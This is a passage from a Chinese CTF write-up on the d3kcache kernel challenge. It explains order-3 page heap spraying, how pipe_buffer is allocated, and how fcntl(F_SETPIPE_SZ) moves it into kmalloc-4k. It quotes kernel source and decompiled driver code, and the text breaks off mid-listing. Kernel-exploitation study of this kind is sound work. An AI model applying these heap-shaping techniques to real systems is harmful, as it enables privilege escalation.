的部分页面）。</p><p>所以这里的使用流程就是，先使用上述办法进行堆喷。</p><ol><li>  释放一部分order为3的page，接着使用victim object进行申请这些页面</li><li>  释放一个页面，使用vuln object申请这一页面</li><li>  释放一部分order为3的page，再次让victim object申请到</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/VvPk5nKYmDCWxOs.png"                      alt="再偷"                ></p><p>最终实现上图这样的效果。</p><h2 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h2><p>在以往的文章中出现了很多次的<code>pipe_buffer</code>，但是可惜的是使用的方式过于简单。比如，只是简单的利用他的ops指针进行泄漏或者覆盖它控制执行流，再就是<code>Dirty Pipe</code>中的利用。可恨的是我在做题的过程中并没有想到使用<code>Dirty Pipe</code>，即便是当时我已经对<code>pipe_buffer</code>所在的堆块上有绝对的权限了。所以这里就不再只是对其ops的利用了，后面主要就是破坏其<code>page</code>指针了。</p><h3 id="pipe-buffer分配过程"><a href="#pipe-buffer分配过程" class="headerlink" title="pipe_buffer分配过程"></a>pipe_buffer分配过程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_DEF_BUFFERS16</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_bufs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">pipe = kzalloc(<span class="keyword">sizeof</span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))</span><br><span class="line">pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">user_bufs = account_pipe_buffers(user, <span class="number">0</span>, pipe_bufs);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) &#123;</span><br><span class="line">user_bufs = account_pipe_buffers(user, pipe_bufs, PIPE_MIN_DEF_BUFFERS);</span><br><span class="line">pipe_bufs = PIPE_MIN_DEF_BUFFERS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(struct pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">pipe-&gt;user = user;</span><br><span class="line">mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line"><span class="keyword">return</span> pipe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="keyword">void</span>) account_pipe_buffers(user, pipe_bufs, <span class="number">0</span>);</span><br><span class="line">kfree(pipe);</span><br><span class="line">out_free_uid:</span><br><span class="line">free_uid(user);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在后面申请<code>pipe-&gt;bufs</code>使用了<code>kcalloc</code>函数，而这个函数的第一个参数分配的数量，第二参数就是每一个单位的大小。其实在其内部中也是会将这两个参数相乘起来的，而这两个值其实都是已知的，第一个为16，第二个为40，那么他们的结果就是640。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">kmalloc_slab</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">192</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!size)</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">index = size_index[size_index_elem(size)];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">index = fls(size - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> kmalloc_caches[kmalloc_type(flags)][index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>kcalloc</code>函数中会到这里进行选择cache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123;</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">96</span>, <span class="number">96</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">192</span>, <span class="number">192</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8</span>, <span class="number">8</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16</span>, <span class="number">16</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32</span>, <span class="number">32</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">64</span>, <span class="number">64</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">128</span>, <span class="number">128</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">256</span>, <span class="number">256</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">512</span>, <span class="number">512</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1024</span>, <span class="number">1</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2048</span>, <span class="number">2</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">4096</span>, <span class="number">4</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8192</span>, <span class="number">8</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16384</span>, <span class="number">16</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32768</span>, <span class="number">32</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">65536</span>, <span class="number">64</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">131072</span>, <span class="number">128</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">262144</span>, <span class="number">256</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">524288</span>, <span class="number">512</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1048576</span>, <span class="number">1</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2097152</span>, <span class="number">2</span>M)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>很明显这里选择的是<code>kmalloc-cg-1k</code>。然而，<code>kmalloc-cg-1k</code>来自于<code>order</code>为2的页面。但是根据前面的意思我们需要<code>order</code>为3的页面出来的，所以如果这里申请的页面<code>order</code>为2的话成功率会大打折扣。</p><h3 id="pipe-buffer修改分配大小"><a href="#pipe-buffer修改分配大小" class="headerlink" title="pipe_buffer修改分配大小"></a>pipe_buffer修改分配大小</h3><p>pipe给人的惊喜是不断的，pipe可以提供了<code>fcntl(F_SETPIPE_SZ)</code>调用去修改每个pipe中<code>pipe_buffer</code>的数量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">pipe_set_size</span><span class="params">(struct pipe_inode_info *pipe, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_bufs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_slots, size;</span><br><span class="line"><span class="keyword">long</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  </span><br><span class="line">  size = round_pipe_size(arg);</span><br><span class="line">nr_slots = size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_slots)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">ret = pipe_resize_ring(pipe, nr_slots);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">pipe-&gt;max_usage = nr_slots;</span><br><span class="line">pipe-&gt;nr_accounted = nr_slots;</span><br><span class="line"><span class="keyword">return</span> pipe-&gt;max_usage * PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="keyword">void</span>) account_pipe_buffers(pipe-&gt;user, nr_slots, pipe-&gt;nr_accounted);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数中会调用到<code>pipe_resize_ring</code>函数，这里会根据size得到<code>nr_slots</code>，而在调用<code>pipe_resize_ring</code>函数时<code>nr_slots</code>为第二个参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe_resize_ring</span><span class="params">(struct pipe_inode_info *pipe, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_slots)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line">bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!bufs))</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">tail = pipe-&gt;tail;</span><br><span class="line"></span><br><span class="line">n = pipe_occupancy(head, tail);</span><br><span class="line"><span class="keyword">if</span> (nr_slots &lt; n) &#123;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">kfree(bufs);</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以注意到的是在这个函数开头的位置就调用了<code>kcalloc</code>函数，而这个函数的第一个参数就是我们可以通过<code>fcntl</code>调用修改的。如果，<code>nr_slots</code>的值为64，那么申请的size即为<code>0xa00</code>则会申请<code>kmalloc-4k</code>，此时<code>order</code>为3，可以大大提高成功率。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">calculate_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_cpus;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to find best configuration for a slab. This</span></span><br><span class="line"><span class="comment"> * works by first attempting to generate a layout with</span></span><br><span class="line"><span class="comment"> * the best configuration and backing off gradually.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * First we increase the acceptable waste in a slab. Then</span></span><br><span class="line"><span class="comment"> * we reduce the minimum objects required in a slab.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">min_objects = slub_min_objects;</span><br><span class="line"><span class="keyword">if</span> (!min_objects) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Some architectures will only update present cpus when</span></span><br><span class="line"><span class="comment"> * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But</span></span><br><span class="line"><span class="comment"> * we also don&#x27;t want to use nr_cpu_ids always, as on some other</span></span><br><span class="line"><span class="comment"> * architectures, there can be many possible cpus, but never</span></span><br><span class="line"><span class="comment"> * onlined. Here we compromise between trying to avoid too high</span></span><br><span class="line"><span class="comment"> * order on systems that appear larger than they are, and too</span></span><br><span class="line"><span class="comment"> * low order on systems that appear smaller than they are.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">nr_cpus = num_present_cpus();</span><br><span class="line"><span class="keyword">if</span> (nr_cpus &lt;= <span class="number">1</span>)</span><br><span class="line">nr_cpus = nr_cpu_ids;</span><br><span class="line">min_objects = <span class="number">4</span> * (fls(nr_cpus) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">max_objects = order_objects(slub_max_order, size);</span><br><span class="line">min_objects = min(min_objects, max_objects);</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能各位会疑惑为什么<code>kmalloc-4k</code>的<code>order</code>为3，这里重新看<code>calculate_order</code>函数，可以看到在对<code>min_objects</code>变量赋值的最后一个操作就是选取最小的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">order_objects</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order) / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>order_objects</code>函数内部是这样的，并且此时<code>slub_max_order</code>的值为3，所以当size为4k时也就是<code>0x1000</code>时<code>max_objects</code>的值为0x8，所以按照这样计算的话后续求得的<code>order</code>为3。</p><h2 id="d3kcache"><a href="#d3kcache" class="headerlink" title="d3kcache"></a>d3kcache</h2><p>前面铺垫了这么多终于到了题目了，如果有了前面提到的所有基础理论知识再来看这道题的话，<del>依旧无法很轻松的完成</del>。</p><p>题目在开了基本的保护之外还开启了很多的编译选项中的保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=<span class="string">&quot;&quot;</span></span><br><span class="line">CONFIG_SLUB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br></pre></td></tr></table></figure><p>这些基本的都是开启了的，除此之外还开启了一个<code>Control Flow Integrity</code>保护。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y</span><br></pre></td></tr></table></figure><p>而这个保护会检测ops是否合法，这个检测十分严格，需要ops的值与一个固定的内容进行异或，结果不为0就直接触发<code>kernel panic</code>。也就是因为当时不清楚这个内容导致我调了半天去劫持<code>pipe_buffer</code>的ops指针。</p><h3 id="驱动分析"><a href="#驱动分析" class="headerlink" title="驱动分析"></a>驱动分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_96B);</span><br><span class="line">  major_num = _register_chrdev(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>, &amp;d3kcache_fo);</span><br><span class="line">  <span class="keyword">if</span> ( major_num &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    module_class = _class_create(&amp;_this_module, <span class="string">&quot;d3kcache&quot;</span>, &amp;d3kcache_module_init___key);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)module_class &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_A0D);</span><br><span class="line">      v0 = <span class="number">0</span>;</span><br><span class="line">      module_device = device_create(module_class, <span class="number">0LL</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(major_num &lt;&lt; <span class="number">20</span>), <span class="number">0LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)module_device &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_A66);</span><br><span class="line">        spin = <span class="number">0</span>;</span><br><span class="line">        kcache_jar = kmem_cache_create_usercopy(<span class="string">&quot;kcache_jar&quot;</span>, <span class="number">0x800</span>LL, <span class="number">0LL</span>, <span class="number">67379200LL</span>, <span class="number">0LL</span>, <span class="number">2048LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="built_in">memset</span>(kcache_list, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        _unregister_chrdev((<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">        printk(&amp;unk_A3B);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)module_device;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      _unregister_chrdev((<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">      printk(&amp;unk_9DE);</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)module_class;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_9AD);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看初始化模块部分，可以看到里面调用了前面提到的<code>kmem_cache_create_usercopy</code>函数，并且参数中size指定为<code>0x800</code>，那么根据前面所以到的，这里的order即为3。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span 